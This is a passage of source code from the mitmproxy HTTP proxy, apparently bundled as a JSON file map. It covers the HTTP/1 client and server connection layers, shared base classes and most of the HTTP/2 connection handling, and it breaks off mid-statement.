ReceiveHttp(self.ReceiveData(self.stream_id, event.data))\n        elif isinstance(event, events.ConnectionClosed):\n            if isinstance(self, Http1Server):\n                yield ReceiveHttp(RequestEndOfMessage(self.stream_id))\n            else:\n                yield ReceiveHttp(ResponseEndOfMessage(self.stream_id))\n\n    def mark_done(\n        self, *, request: bool = False, response: bool = False\n    ) -> layer.CommandGenerator[None]:\n        if request:\n            self.request_done = True\n        if response:\n            self.response_done = True\n        if self.request_done and self.response_done:\n            assert self.request\n            assert self.response\n            if should_make_pipe(self.request, self.response):\n                yield from self.make_pipe()\n                return\n            try:\n                read_until_eof_semantics = (\n                    http1.expected_http_body_size(self.request, self.response) == -1\n                )\n            except ValueError:\n                # this may raise only now (and not earlier) because an addon set invalid headers,\n                # in which case it's not really clear what we are supposed to do.\n                read_until_eof_semantics = False\n            connection_done = (\n                read_until_eof_semantics\n                or http1.connection_close(\n                    self.request.http_version, self.request.headers\n                )\n                or http1.connection_close(\n                    self.response.http_version, self.response.headers\n                )\n                # If we proxy HTTP/2 to HTTP/1, we only use upstream connections for one request.\n                # This simplifies our connection management quite a bit as we can rely on\n                # the proxyserver's max-connection-per-server throttling.\n                or (\n                    (self.request.is_http2 or self.request.is_http3)\n                    and isinstance(self, Http1Client)\n                )\n            )\n            if connection_done:\n                yield commands.CloseConnection(self.conn)\n                self.state = self.done\n                return\n            self.request_done = self.response_done = False\n            self.request = self.response = None\n            if isinstance(self, Http1Server):\n                self.stream_id += 2\n            else:\n                self.stream_id = None\n            self.state = self.read_headers\n            if self.buf:\n                yield from self.state(events.DataReceived(self.conn, b\"\"))\n\n\nclass Http1Server(Http1Connection):\n    \"\"\"A simple HTTP/1 server with no pipelining support.\"\"\"\n\n    ReceiveProtocolError = RequestProtocolError\n    ReceiveData = RequestData\n    ReceiveEndOfMessage = RequestEndOfMessage\n    stream_id: int\n\n    def __init__(self, context: Context):\n        super().__init__(context, context.client)\n        self.stream_id = 1\n\n    def send(self, event: HttpEvent) -> layer.CommandGenerator[None]:\n        assert event.stream_id == self.stream_id\n        if isinstance(event, ResponseHeaders):\n            self.response = response = event.response\n\n            if response.is_http2 or response.is_http3:\n                response = response.copy()\n                # Convert to an HTTP/1 response.\n                response.http_version = \"HTTP/1.1\"\n                # not everyone supports empty reason phrases, so we better make up one.\n                response.reason = status_codes.RESPONSES.get(response.status_code, \"\")\n                # Shall we set a Content-Length header here if there is none?\n                # For now, let's try to modify as little as possible.\n\n            raw = http1.assemble_response_head(response)\n            yield commands.SendData(self.conn, raw)\n        elif isinstance(event, ResponseData):\n            assert self.response\n            if \"chunked\" in self.response.headers.get(\"transfer-encoding\", \"\").lower():\n                raw = b\"%x\\r\\n%s\\r\\n\" % (len(event.data), event.data)\n            else:\n                raw = event.data\n            if raw:\n                yield commands.SendData(self.conn, raw)\n        elif isinstance(event, ResponseEndOfMessage):\n            assert self.request\n            assert self.response\n            if (\n                self.request.method.upper() != \"HEAD\"\n                and \"chunked\"\n                in self.response.headers.get(\"transfer-encoding\", \"\").lower()\n            ):\n                yield commands.SendData(self.conn, b\"0\\r\\n\\r\\n\")\n            yield from self.mark_done(response=True)\n        elif isinstance(event, ResponseProtocolError):\n            if not self.response and event.code != status_codes.NO_RESPONSE:\n                yield commands.SendData(\n                    self.conn, make_error_response(event.code, event.message)\n                )\n            if self.conn.state & ConnectionState.CAN_WRITE:\n                yield commands.CloseConnection(self.conn)\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    def read_headers(\n        self, event: events.ConnectionEvent\n    ) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.DataReceived):\n            request_head = self.buf.maybe_extract_lines()\n            if request_head:\n                try:\n                    self.request = http1.read_request_head(\n                        [bytes(x) for x in request_head]\n                    )\n                    if self.context.options.validate_inbound_headers:\n                        http1.validate_headers(self.request.headers)\n                    expected_body_size = http1.expected_http_body_size(self.request)\n                except ValueError as e:\n                    yield commands.SendData(self.conn, make_error_response(400, str(e)))\n                    yield commands.CloseConnection(self.conn)\n                    if self.request:\n                        # we have headers that we can show in the ui\n                        yield ReceiveHttp(\n                            RequestHeaders(self.stream_id, self.request, False)\n                        )\n                        yield ReceiveHttp(\n                            RequestProtocolError(self.stream_id, str(e), 400)\n                        )\n                    else:\n                        yield commands.Log(\n                            f\"{human.format_address(self.conn.peername)}: {e}\"\n                        )\n                    self.state = self.done\n                    return\n                yield ReceiveHttp(\n                    RequestHeaders(\n                        self.stream_id, self.request, expected_body_size == 0\n                    )\n                )\n                self.body_reader = make_body_reader(expected_body_size)\n                self.state = self.read_body\n                yield from self.state(event)\n            else:\n                pass  # FIXME: protect against header size DoS\n        elif isinstance(event, events.ConnectionClosed):\n            buf = bytes(self.buf)\n            if buf.strip():\n                yield commands.Log(\n                    f\"Client closed connection before completing request headers: {buf!r}\"\n                )\n            yield commands.CloseConnection(self.conn)\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    def mark_done(\n        self, *, request: bool = False, response: bool = False\n    ) -> layer.CommandGenerator[None]:\n        yield from super().mark_done(request=request, response=response)\n        if self.request_done and not self.response_done:\n            self.state = self.wait\n\n\nclass Http1Client(Http1Connection):\n    \"\"\"A simple HTTP/1 client with no pipelining support.\"\"\"\n\n    ReceiveProtocolError = ResponseProtocolError\n    ReceiveData = ResponseData\n    ReceiveEndOfMessage = ResponseEndOfMessage\n\n    def __init__(self, context: Context):\n        super().__init__(context, context.server)\n\n    def send(self, event: HttpEvent) -> layer.CommandGenerator[None]:\n        if isinstance(event, RequestProtocolError):\n            yield commands.CloseConnection(self.conn)\n            return\n\n        if self.stream_id is None:\n            assert isinstance(event, RequestHeaders)\n            self.stream_id = event.stream_id\n            self.request = event.request\n        assert self.stream_id == event.stream_id\n\n        if isinstance(event, RequestHeaders):\n            request = event.request\n            if request.is_http2 or request.is_http3:\n                # Convert to an HTTP/1 request.\n                request = (\n                    request.copy()\n                )  # (we could probably be a bit more efficient here.)\n                request.http_version = \"HTTP/1.1\"\n                if \"Host\" not in request.headers and request.authority:\n                    request.headers.insert(0, \"Host\", request.authority)\n                request.authority = \"\"\n                cookie_headers = request.headers.get_all(\"Cookie\")\n                if len(cookie_headers) > 1:\n                    # Only HTTP/2 supports multiple cookie headers, HTTP/1.x does not.\n                    # see: https://www.rfc-editor.org/rfc/rfc6265#section-5.4\n                    #      https://www.rfc-editor.org/rfc/rfc7540#section-8.1.2.5\n                    request.headers[\"Cookie\"] = \"; \".join(cookie_headers)\n            raw = http1.assemble_request_head(request)\n            yield commands.SendData(self.conn, raw)\n        elif isinstance(event, RequestData):\n            assert self.request\n            if \"chunked\" in self.request.headers.get(\"transfer-encoding\", \"\").lower():\n                raw = b\"%x\\r\\n%s\\r\\n\" % (len(event.data), event.data)\n            else:\n                raw = event.data\n            if raw:\n                yield commands.SendData(self.conn, raw)\n        elif isinstance(event, RequestEndOfMessage):\n            assert self.request\n            if \"chunked\" in self.request.headers.get(\"transfer-encoding\", \"\").lower():\n                yield commands.SendData(self.conn, b\"0\\r\\n\\r\\n\")\n            elif http1.expected_http_body_size(self.request, self.response) == -1:\n                yield commands.CloseTcpConnection(self.conn, half_close=True)\n            yield from self.mark_done(request=True)\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n    def read_headers(\n        self, event: events.ConnectionEvent\n    ) -> layer.CommandGenerator[None]:\n        if isinstance(event, events.DataReceived):\n            if not self.request:\n                # we just received some data for an unknown request.\n                yield commands.Log(f\"Unexpected data from server: {bytes(self.buf)!r}\")\n                yield commands.CloseConnection(self.conn)\n                return\n            assert self.stream_id is not None\n\n            response_head = self.buf.maybe_extract_lines()\n            if response_head:\n                try:\n                    self.response = http1.read_response_head(\n                        [bytes(x) for x in response_head]\n                    )\n                    if self.context.options.validate_inbound_headers:\n                        http1.validate_headers(self.response.headers)\n                    expected_size = http1.expected_http_body_size(\n                        self.request, self.response\n                    )\n                except ValueError as e:\n                    yield commands.CloseConnection(self.conn)\n                    yield ReceiveHttp(\n                        ResponseProtocolError(\n                            self.stream_id, f\"Cannot parse HTTP response: {e}\"\n                        )\n                    )\n                    return\n                yield ReceiveHttp(\n                    ResponseHeaders(self.stream_id, self.response, expected_size == 0)\n                )\n                self.body_reader = make_body_reader(expected_size)\n\n                self.state = self.read_body\n                yield from self.state(event)\n            else:\n                pass  # FIXME: protect against header size DoS\n        elif isinstance(event, events.ConnectionClosed):\n            if self.conn.state & ConnectionState.CAN_WRITE:\n                yield commands.CloseConnection(self.conn)\n            if self.stream_id:\n                if self.buf:\n                    yield ReceiveHttp(\n                        ResponseProtocolError(\n                            self.stream_id,\n                            f\"unexpected server response: {bytes(self.buf)!r}\",\n                        )\n                    )\n                else:\n                    # The server has closed the connection to prevent us from continuing.\n                    # We need to signal that to the stream.\n                    # https://tools.ietf.org/html/rfc7231#section-6.5.11\n                    yield ReceiveHttp(\n                        ResponseProtocolError(\n                            self.stream_id, \"server closed connection\"\n                        )\n                    )\n            else:\n                return\n        else:\n            raise AssertionError(f\"Unexpected event: {event}\")\n\n\ndef should_make_pipe(request: http.Request, response: http.Response) -> bool:\n    if response.status_code == 101:\n        return True\n    elif response.status_code == 200 and request.method.upper() == \"CONNECT\":\n        return True\n    else:\n        return False\n\n\ndef make_body_reader(expected_size: int | None) -> TBodyReader:\n    if expected_size is None:\n        return ChunkedReader()\n    elif expected_size == -1:\n        return Http10Reader()\n    else:\n        return ContentLengthReader(expected_size)\n\n\ndef make_error_response(\n    status_code: int,\n    message: str = \"\",\n) -> bytes:\n    resp = http.Response.make(\n        status_code,\n        format_error(status_code, message),\n        http.Headers(\n            Server=version.MITMPROXY,\n            Connection=\"close\",\n            Content_Type=\"text/html\",\n        ),\n    )\n    return http1.assemble_response(resp)\n\n\n__all__ = [\n    \"Http1Client\",\n    \"Http1Server\",\n]\n", "mitmproxy/proxy/layers/http/_base.py": "import html\nimport textwrap\nfrom dataclasses import dataclass\n\nfrom mitmproxy import http\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.proxy import commands\nfrom mitmproxy.proxy import events\nfrom mitmproxy.proxy import layer\nfrom mitmproxy.proxy.context import Context\n\nStreamId = int\n\n\n@dataclass\nclass HttpEvent(events.Event):\n    # we need stream ids on every event to avoid race conditions\n    stream_id: StreamId\n\n\nclass HttpConnection(layer.Layer):\n    conn: Connection\n\n    def __init__(self, context: Context, conn: Connection):\n        super().__init__(context)\n        self.conn = conn\n\n\nclass HttpCommand(commands.Command):\n    pass\n\n\nclass ReceiveHttp(HttpCommand):\n    event: HttpEvent\n\n    def __init__(self, event: HttpEvent):\n        self.event = event\n\n    def __repr__(self) -> str:\n        return f\"Receive({self.event})\"\n\n\ndef format_error(status_code: int, message: str) -> bytes:\n    reason = http.status_codes.RESPONSES.get(status_code, \"Unknown\")\n    return (\n        textwrap.dedent(\n            f\"\"\"\n    <html>\n    <head>\n        <title>{status_code} {reason}</title>\n    </head>\n    <body>\n        <h1>{status_code} {reason}</h1>\n        <p>{html.escape(message)}</p>\n    </body>\n    </html>\n    \"\"\"\n        )\n        .strip()\n        .encode(\"utf8\", \"replace\")\n    )\n", "mitmproxy/proxy/layers/http/_http2.py": "import collections\nimport time\nfrom collections.abc import Sequence\nfrom enum import Enum\nfrom logging import DEBUG\nfrom logging import ERROR\nfrom typing import ClassVar\n\nimport h2.config\nimport h2.connection\nimport h2.errors\nimport h2.events\nimport h2.exceptions\nimport h2.settings\nimport h2.stream\nimport h2.utilities\n\nfrom ...commands import CloseConnection\nfrom ...commands import Log\nfrom ...commands import RequestWakeup\nfrom ...commands import SendData\nfrom ...context import Context\nfrom ...events import ConnectionClosed\nfrom ...events import DataReceived\nfrom ...events import Event\nfrom ...events import Start\nfrom ...events import Wakeup\nfrom ...layer import CommandGenerator\nfrom ...utils import expect\nfrom . import RequestData\nfrom . import RequestEndOfMessage\nfrom . import RequestHeaders\nfrom . import RequestProtocolError\nfrom . import RequestTrailers\nfrom . import ResponseData\nfrom . import ResponseEndOfMessage\nfrom . import ResponseHeaders\nfrom . import ResponseProtocolError\nfrom . import ResponseTrailers\nfrom ._base import format_error\nfrom ._base import HttpConnection\nfrom ._base import HttpEvent\nfrom ._base import ReceiveHttp\nfrom ._http_h2 import BufferedH2Connection\nfrom ._http_h2 import H2ConnectionLogger\nfrom mitmproxy import http\nfrom mitmproxy import version\nfrom mitmproxy.connection import Connection\nfrom mitmproxy.net.http import status_codes\nfrom mitmproxy.net.http import url\nfrom mitmproxy.utils import human\n\n\nclass StreamState(Enum):\n    EXPECTING_HEADERS = 1\n    HEADERS_RECEIVED = 2\n\n\nCATCH_HYPER_H2_ERRORS = (ValueError, IndexError)\n\n\nclass Http2Connection(HttpConnection):\n    h2_conf: ClassVar[h2.config.H2Configuration]\n    h2_conf_defaults = dict(\n        header_encoding=False,\n        validate_outbound_headers=False,\n        # validate_inbound_headers is controlled by the validate_inbound_headers option.\n        normalize_inbound_headers=False,  # changing this to True is required to pass h2spec\n        normalize_outbound_headers=False,\n    )\n    h2_conn: BufferedH2Connection\n    streams: dict[int, StreamState]\n    \"\"\"keep track of all active stream ids to send protocol errors on teardown\"\"\"\n\n    ReceiveProtocolError: type[RequestProtocolError | ResponseProtocolError]\n    ReceiveData: type[RequestData | ResponseData]\n    ReceiveTrailers: type[RequestTrailers | ResponseTrailers]\n    ReceiveEndOfMessage: type[RequestEndOfMessage | ResponseEndOfMessage]\n\n    def __init__(self, context: Context, conn: Connection):\n        super().__init__(context, conn)\n        if self.debug:\n            self.h2_conf.logger = H2ConnectionLogger(\n                self.context.client.peername, self.__class__.__name__\n            )\n        self.h2_conf.validate_inbound_headers = (\n            self.context.options.validate_inbound_headers\n        )\n        self.h2_conn = BufferedH2Connection(self.h2_conf)\n        self.streams = {}\n\n    def is_closed(self, stream_id: int) -> bool:\n        \"\"\"Check if a non-idle stream is closed\"\"\"\n        stream = self.h2_conn.streams.get(stream_id, None)\n        if (\n            stream is not None\n            and stream.state_machine.state is not h2.stream.StreamState.CLOSED\n            and self.h2_conn.state_machine.state\n            is not h2.connection.ConnectionState.CLOSED\n        ):\n            return False\n        else:\n            return True\n\n    def is_open_for_us(self, stream_id: int) -> bool:\n        \"\"\"Check if we can write to a non-idle stream.\"\"\"\n        stream = self.h2_conn.streams.get(stream_id, None)\n        if (\n            stream is not None\n            and stream.state_machine.state\n            is not h2.stream.StreamState.HALF_CLOSED_LOCAL\n            and stream.state_machine.state is not h2.stream.StreamState.CLOSED\n            and self.h2_conn.state_machine.state\n            is not h2.connection.ConnectionState.CLOSED\n        ):\n            return True\n        else:\n            return False\n\n    def _handle_event(self, event: Event) -> CommandGenerator[None]:\n        if isinstance(event, Start):\n            self.h2_conn.initiate_connection()\n            yield SendData(self.conn, self.h2_conn.data_to_send())\n\n        elif isinstance(event, HttpEvent):\n            if isinstance(event, (RequestData, ResponseData)):\n                if self.is_open_for_us(event.stream_id):\n                    self.h2_conn.send_data(event.stream_id, event.data)\n            elif isinstance(event, (RequestTrailers, ResponseTrailers)):\n                if self.is_open_for_us(event.stream_id):\n                    trailers = [*event.trailers.fields]\n                    self.h2_conn.send_trailers(event.stream_id, trailers)\n            elif isinstance(event, (RequestEndOfMessage, ResponseEndOfMessage)):\n                if self.is_open_for_us(event.stream_id):\n                    self.h2_conn.end_stream(event.stream_id)\n            elif isinstance(event, (RequestProtocolError, ResponseProtocolError)):\n                if not self.is_closed(event.stream_id):\n                    code = {\n                        status_codes.CLIENT_CLOSED_REQUEST: h2.errors.ErrorCodes.CANCEL,\n                    }.get(event.code, h2.errors.ErrorCodes.INTERNAL_ERROR)\n                    stream: h2.stream.H2Stream = self.h2_conn.streams[event.stream_id]\n                    send_error_message = (\n                        isinstance(event, ResponseProtocolError)\n                        and self.is_open_for_us(event.stream_id)\n                        and not stream.state_machine.headers_sent\n                        and event.code != status_codes.NO_RESPONSE\n                    )\n                    if send_error_message:\n                        self.h2_conn.send_headers(\n                            event.stream_id,\n                            [\n                                (b\":status\", b\"%d\" % event.code),\n                                (b\"server\", version.MITMPROXY.encode()),\n                                (b\"content-type\", b\"text/html\"),\n                            ],\n                        )\n                        self.h2_conn.send_data(\n                            event.stream_id,\n                            format_error(event.code, event.message),\n                            end_stream=True,\n                        )\n                    else:\n                        self.h2_conn.reset_stream(event.stream_id, code)\n            else:\n                raise AssertionError(f\"Unexpected event: {event}\")\n            data_to_send = self.h2_conn.data_to_send()\n            if data_to_send:\n                yield SendData(self.conn, data_to_send)\n\n        elif isinstance(event, DataReceived):\n            try:\n                try:\n                    events = self.h2_conn.receive_data(event.data)\n                except CATCH_HYPER_H2_ERRORS as e:  # pragma: no cover\n                    # this should never raise a ValueError, but we triggered one while fuzzing:\n                    # https://github.com/python-hyper/hyper-h2/issues/1231\n                    # this stays here as defense-in-depth.\n                    raise h2.exceptions.ProtocolError(\n                        f\"uncaught hyper-h2 error: {e}\"\n                    ) from e\n            except h2.exceptions.ProtocolError as e:\n                events = [e]\n\n            for h2_event in events:\n                if self.debug:\n                    yield Log(f\"{self.debug}[h2] {h2_event}\", DEBUG)\n                if (yield from self.handle_h2_event(h2_event)):\n                    if self.debug:\n                        yield Log(f\"{self.debug}[h2] done\", DEBUG)\n                    return\n\n            data_to_send = self.h2_conn.data_to_send()\n            if data_to_send:\n                yield SendData(self.conn, data_to_send)\n\n        elif isinstance(event, ConnectionClosed):\n            yield from self.close_connection(\"peer closed connection\")\n        else:\n            raise AssertionError(f\"Unexpected event: {event!r}\")\n\n    def handle_h2_event(self, event: h2.events.Event) -> CommandGenerator[bool]:\n        \"\"\"returns true if further processing should be stopped.\"\"\"\n        if isinstance(event, h2.events.DataReceived):\n            state = self.streams.get(event.stream_id, None)\n            if state is StreamState.HEADERS_RECEIVED:\n                yield ReceiveHttp(self.ReceiveData(event.stream_id, event.data))\n            elif state is StreamState.EXPECTING_HEADERS:\n                yield from self.protocol_error(\n                    f\"Received HTTP/2 data frame, expected headers.\"\n                )\n                return True\n            self.h2_conn.acknowledge_received_data(\n                event.flow_controlled_length, event.stream_id\n            )\n        elif isinstance(event, h2.events.TrailersReceived):\n            trailers = http.Headers(event.headers)\n            yield ReceiveHttp(self.ReceiveTrailers(event.stream_id, trailers))\n        elif isinstance(event, h2.events.StreamEnded):\n            state = self.streams.get(event.stream_id, None)\n            if state is StreamState.HEADERS_RECEIVED:\n                yield ReceiveHttp(self.ReceiveEndOfMessage(event.stream_id))\n            elif state is StreamState.EXPECTING_HEADERS:\n                raise AssertionError(\"unreachable\")\n            if self.is_closed(event.stream_id):\n                self.streams.pop(event.stream_id, None)\n        elif isinstance(event, h2.events.StreamReset):\n            if event.stream_id in self.streams:\n                try:\n                    err_str = h2.errors.ErrorCodes(event.error_code).name\n                except ValueError:\n                    err_str = str(event.error_code)\n                err_code = {\n                    h2.errors.ErrorCodes.CANCEL: status_codes.CLIENT_CLOSED_REQUEST,\n                }.get(event.error_code, self.ReceiveProtocolError.code)\n                yield ReceiveHttp(\n                    self.ReceiveProtocolError(\n                        event.stream_id,\n                        f\"stream reset by client ({err_str})\",\n                        code=err_code,\n                    )\n                )\n                self.streams.pop(event.stream_id)\n            else:\n                pass  # We don't track priority frames which could be followed by a stream reset here.\n        elif isinstance(event, h2.exceptions.ProtocolError):\n            yield from self.protocol_error(f\"HTTP/2 protocol error: {event}\")\n            return True\n        elif isinstance(event, h2.events.ConnectionTerminated):\n            yield from self.close_connection(f\"HTTP/2 connection closed: {event!r}\")\n            return True\n            # The implementation above isn't really ideal, we should probably only terminate streams > last_stream_id?\n            # We currently lack a mechanism to signal that connections are still active but cannot be reused.\n            # for stream_id in self.streams:\n            #    if stream_id > event.last_stream_id:\n            #        yield ReceiveHttp(self.ReceiveProtocolError(stream_id, f\"HTTP/2 connection closed: {event!r}\"))\n            #        self.streams.pop(stream_id)\n        elif isinstance(event, h2.events.RemoteSettingsChanged):\n            pass\n        elif isinstance(event, h2.events.SettingsAcknowledged):\n            pass\n        elif isinstance(event, h2.events.PriorityUpdated):\n            pass\n        elif isinstance(event, h2.events.PingReceived):\n            pass\n        elif isinstance(event, h2.events.PingAckReceived):\n            pass\n        elif isinstance(event, h2.events.PushedStreamReceived):\n            yield Log(\n                \"Received HTTP/2 push promise, even though we signalled no support.\",\n                ERROR,\n            )\n        elif isinstance(event, h2.events.UnknownFrameReceived):\n            # https://http2.github.io/http2-spec/#rfc.section.4.1\n            # Implementations MUST ignore and discard any frame that has a type that is unknown.\n            yield Log(f\"Ignoring unknown HTTP/2 frame type: {event.frame.type}\")\n        elif isinstance(event, h2.events.AlternativeServiceAvailable):\n            yield Log(\n                \"Received HTTP/2 Alt-Svc frame, which will not be forwarded.\", DEBUG\n            )\n        else:\n            raise AssertionError(f\"Unexpected event: {event!r}\")\n        return False\n\n    def protocol_error(\n        self,\n        message: str,\n        error_code: int = h2.errors.ErrorCodes.PROTOCOL_ERROR,\n    ) -> CommandGenerator[None]:\n        yield Log(f\"{human.format_address(self.conn.peername)}: {message}\")\n        self.h2_conn.close_connection(error_code, message.encode())\n        yield SendData(self.conn, self.h2_conn.data_to_send())\n        yield from self.close_connection(message)\n\n    def close_connection(self, msg: str) -> CommandGenerator[None]:\n        yield CloseConnection(self.conn)\n        for stream_id in self.streams:\n            yield ReceiveHttp(self.ReceiveProtocolError(stream_id, msg))\n        self.streams.clear()\n        self._handle_event = self.done  # type: ignore\n\n    @expect(DataReceived, HttpEvent, ConnectionClosed, Wakeup)\n    def done(self, _) -> CommandGenerator[None]:\n        yield from ()\n\n\ndef normalize_h1_headers(\n    headers: list[tuple[bytes, bytes]], is_client: bool\n) -> list[tuple[bytes, bytes]]:\n    # HTTP/1 servers commonly send capitalized headers (Content-Length vs content-length),\n    # which isn't valid HTTP/2. As such we normalize.\n    headers = h2.utilities.normalize_outbound_headers(\n        headers,\n        h2.utilities.HeaderValidationFlags(is_client, False, not is_client, False),\n    )\n    # make sure that this is not just an iterator but an iterable,\n    # otherwise hyper-h2 will silently drop headers.\n    headers = list(headers)\n    return headers\n\n\ndef normalize_h2_headers(headers: list[tuple[bytes, bytes]]) -> CommandGenerator[None]:\n    for i in range(len(headers)):\n        if not headers[i][0].islower():\n            yield Log(\n                f\"Lowercased {repr(headers[i][0]).lstrip('b')} header as uppercase is not allowed with HTTP/2.\"\n            )\n            headers[i] = (headers[i][0].lower(), headers[i][1])\n\n\ndef format_h2_request_headers(\n    context: Context,\n    event: RequestHeaders,\n) -> CommandGenerator[list[tuple[bytes, bytes]]]:\n    pseudo_headers = [\n        (b\":method\", event.request.data.method),\n        (b\":scheme\", event.request.data.scheme),\n        (b\":path\", event.request.data.path),\n    ]\n    if event.request.authority:\n        pseudo_headers.append((b\":authority\", event.request.data.authority))\n\n    if event.request.is_http2 or event.request.is_http3:\n        hdrs = list(event.request.headers.fields)\n        if context.options.normalize_outbound_headers:\n            yield from normalize_h2_headers(hdrs)\n    else:\n        headers = event.request.headers\n        if not event.request.authority and \"host\" in headers:\n            headers = headers.copy()\n            pseudo_headers.append((b\":authority\", headers.pop(b\"host\")))\n        hdrs = normalize_h1_headers(list(headers.fields), True)\n\n    return pseudo_headers + hdrs\n\n\ndef format_h2_response_headers(\n    context: Context,\n    event: ResponseHeaders,\n) -> CommandGenerator[list[tuple[bytes, bytes]]]:\n    headers = [\n        (b\":status\", b\"%d\" % event.response.status_code),\n        *event.response.headers.fields,\n    ]\n    if event.response.is_http2 or event.response.is_http3:\n        if context.options.normalize_outbound_headers:\n            yield from normalize_h2_headers(headers)\n    else:\n        headers = normalize_h1_headers(headers, False)\n    return headers\n\n\nclass Http2Server(Http2Connection):\n    h2_conf = h2.config.H2Configuration(\n        **Http2Connection.h2_conf_defaults,\n        client_side=False,\n    )\n\n    ReceiveProtocolError = RequestProtocolError\n    ReceiveData = RequestData\n    ReceiveTrailers = RequestTrailers\n    ReceiveEndOfMessage = RequestEndOfMessage\n\n    def __init__(self, context: Context):\n        super().__init__(context, context.client)\n\n    def _handle_event(self, event: Event) -> CommandGenerator[None]:\n        if isinstance(event, ResponseHeaders):\n            if self.is_open_for_us(event.stream_id):\n                self.h2_conn.send_headers(\n                    event.stream_id,\n                    headers=(\n                        yield from format_h2_response_headers(self.context, event)\n                    ),\n                    end_stream=event.end_stream,\n                )\n                yield SendData(self.conn, self.h2_conn.data_to_send())\n        else:\n            yield from super()._handle_event(event)\n\n    def handle_h2_event(self, event: h2.events.Event) -> CommandGenerator[bool]:\n        if isinstance(event, h2.events.RequestReceived):\n            try:\n                (\n                    host,\n                    port,\n                    method,\n                    scheme,\n                    authority,\n                    path,\n                    headers,\n                ) = parse_h2_request_headers(event.headers)\n            except ValueError as e:\n                yield from self.protocol_error(f\"Invalid HTTP/2 request headers: {e}\")\n                return True\n            request = http.Request(\n                host=host,\n                port=port,\n                method=method,\n                scheme=scheme,\n                authority=authority,\n                path=path,\n                http_version=b\"HTTP/2.0\",\n                headers=headers,\n                content=None,\n                trailers=None,\n                timestamp_start=time.time(),\n                timestamp_end=None,\n            )\n            self.streams[event.stream_id] = StreamState.HEADERS_RECEIVED\n            yield ReceiveHttp(\n                RequestHeaders(\n                    event.stream_id, request, end_stream=bool(event.stream_ended)\n                )\n            )\n            return False\n        else:\n            return (yield from super().handle_h2_event(event))\n\n\nclass Http2Client(Http2Connection):\n    h2_conf = h2.config.H2Configuration(\n        **Http2Connection.h2_conf_defaults,\n        client_side=True,\n    )\n\n    ReceiveProtocolError = ResponseProtocolError\n    ReceiveData = ResponseData\n    ReceiveTrailers = ResponseTrailers\n    ReceiveEndOfMessage = ResponseEndOfMessage\n\n    our_stream_id: dict[int, int]\n    their_stream_id: dict[int, int]\n    stream_queue: collections.defaultdict[int, list[Event]]\n    \"\"\"Queue of streams that we haven't sent yet because we have reached MAX_CONCURRENT_STREAMS\"\"\"\n    provisional_max_concurrency: int | None = 10\n    \"\"\"A provisional currency limit before we get the server's first settings frame.\"\"\"\n    last_activity: float\n    \"\"\"Timestamp of when we've last seen network activity on this connection.\"\"\"\n\n    def __init__(self, context: Context):\n        super().__init__(context, context.server)\n        # Disable HTTP/2 push for now to keep things simple.\n        # don't send here, that is done as part of initiate_connection().\n        self.h2_conn.local_settings.enable_push = 0\n        # hyper-h2 pitfall: we need to acknowledge here, otherwise its sends out the old settings.\n        self.h2_conn.local_settings.acknowledge()\n        self.our_stream_id = {}\n        self.their_stream_id = {}\n        self.stream_queue = collections.defaultdict(list)\n\n    def _handle_event(self, event: Event) -> CommandGenerator[None]:\n        # We can't reuse stream ids from the client because they may arrived reordered here\n        # and HTTP/2 forbids opening a stream on a lower id than what was previously sent (see test_stream_concurrency).\n        # To mitigate this, we transparently map the outside's stream id to our stream id.\n        if isinstance(event, HttpEvent):\n            ours = self.our_stream_id.get(event.stream_id, None)\n            if ours is None:\n                no_free_streams = self.h2_conn.open_outbound_streams >= (\n                    self.provisional_max_concurrency\n                    or self.h2_conn.remote_settings.max_concurrent_streams\n                )\n                if no_free_streams:\n                    self.stream_queue[event.stream_id].append(event)\n                    return\n                ours = self.h2_conn.get_next_available_stream_id()\n                self.our_stream_id[event.stream_id] = ours\n                self.their_stream_id[ours] = event.stream_id\n            event.stream_id = ours\n\n        for cmd in self._handle_event2(event):\n            if isinstance(cmd, ReceiveHttp):\n                cmd.event.stream_id = self.their_stream_id[cmd.event.stream_id]\n            yield cmd\n\n        can_resume_queue = self.stream_queue and self.h2_conn.open_outbound_streams < (\n            self.provisional_max_concurrency\n            or self.h2_conn.remote_settings.max_concurrent_streams\n        )\n        if can_resume_queue:\n            # popitem would be LIFO, but we want FIFO.\n            events = self.stream_queue.pop(next(iter(self.stream_queue)))\n            for event in events:\n                yield from self._handle_event(event)\n\n    def _handle_event2(self, event: Event) -> CommandGenerator[None]:\n        if isinstance(event, Wakeup):\n            send_ping_now = (\n                # add one second to avoid unnecessary roundtrip, we don't need to be super correct here.\n                time.time() - self.last_activity + 1\n                > self.context.options.http2_ping_keepalive\n            )\n            if send_ping_now:\n                # PING frames MUST contain 8 octets of opaque data in the payload.\n                # A sender can include any value it chooses and use those octets in any fashion.\n                self.last_activity = time.time()\n                self.h2_conn.ping(b\"0\" * 8)\n                data = self.h2_conn.data_to_send()\n                if data is not None:\n                    yield Log(\n                        f\"Send HTTP/2 keep-alive PING to {human.format_address(self.conn.peername)}\",\n                        DEBUG,\n                    )\n                    yield SendData(self.conn, data)\n            time_until_next_ping = self.context.options.http2_ping_keepalive - (\n                time.time() - self.last_activity\n            )\n            yield RequestWakeup(time_until_next_ping)\n            return\n\n        self.last_activity = time.time()\n        if isinstance(event, Start):\n            if self.context.options.http2_ping_keepalive > 0:\n                yield RequestWakeup(self.context.options.http2_ping_keepalive)\n            yield from super()._handle_event(event)\n        elif isinstance(event, RequestHeaders):\n            self.h2_conn.send_headers(\n                event.stream_id,\n                headers=(yield from format_h2_request_headers(self.context, event)),\n                end_stream=event.end_stream,\n            )\n            self.streams[event.stream_id] = StreamState.EXPECTING_HEADERS\n            yield SendData(self.conn, self.h2_conn.data_to_send())\n        else:\n            yield from super()._handle_event(event)\n\n    def handle_h2_event(self, event: h2.events.Event) -> CommandGenerator[bool]:\n        if isinstance(event, h2.events.ResponseReceived):\n            if (\n                self.streams.get(event.stream_id, None)\n                is not StreamState.EXPECTING_HEADERS\n            ):\n                yield from self.protocol_error(f\"Received unexpected HTTP/2 response.\")\n                return True\n\n            try:\n                status_code, headers = parse_h2_response_headers(event.headers)\n            except ValueError as e:\n                yield from self.protocol_error(f\"Invalid HTTP/2 response headers: {e}\")\n                return True\n\n            response = http.Response(\n                http_version=b\"HTTP/2.0\",\n                status_code=status_code,\n                reason=b\"\",\n                headers=headers,\n                content=None,\n                trailers=None,\n                